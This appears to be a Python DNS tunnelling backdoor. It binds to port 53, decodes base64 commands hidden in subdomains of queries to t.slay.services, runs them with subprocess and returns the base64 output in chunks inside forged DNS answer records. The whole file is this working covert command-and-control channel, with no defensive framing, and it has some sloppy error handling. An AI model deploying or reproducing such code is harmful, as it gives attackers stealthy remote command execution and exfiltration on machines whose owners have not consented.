import socket
import re
import binascii
import base64
from dnslib import *
import subprocess
import time

# Bind socket to port 53 on all interfaces for DNS queries
UDP_IP = "0.0.0.0"
UDP_PORT = 53
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind((UDP_IP, UDP_PORT))

while True:

    byteData, addr = sock.recvfrom(2048) # buffer size is 2048 bytes

    try:
        msg = binascii.unhexlify(binascii.b2a_hex(byteData))
        msg = DNSRecord.parse(msg)
        qid = msg.header.id
    except Exception as e:
        print(e)
        break

    # Retrieve prepended data to domain of query, decode
    m = re.search(r'\;(\S+)\.t\.slay\.services', str(msg), re.MULTILINE)
    base64_message = m.group(1)
    base64_bytes = base64_message.encode('ascii')
    message_bytes = base64.b64decode(base64_bytes)
    message = message_bytes.decode('ascii')

    if m:
        print('got data:', message)
    else:
        print("no data")
        break
    
    # Split command by spaces to run as subprocess and encode output
    lin_message = message.split()
    response = subprocess.check_output([lin_message[0], lin_message[1], lin_message[2]])
    send_base64_bytes = base64.b64encode(response)
    send_base64_message = send_base64_bytes.decode('ascii')

    # Break output into chunks to send in DNS header of response 
    n = 12
    chunks = [send_base64_message[i:i+n] for i in range(0, len(send_base64_message), n)]
    
    print('sending: ', chunks)

    # Send each chunk in separate DNS response
    for chunk in chunks:
        d = DNSRecord(DNSHeader(id=qid),
            q=DNSQuestion(base64_message + ".t.slay.services"),
            a=RR(chunk + ".m.slay.services",rdata=A("35.239.239.183")))

        sock.sendto(d.pack(), (addr))
        time.sleep(0.1)

sock.close()








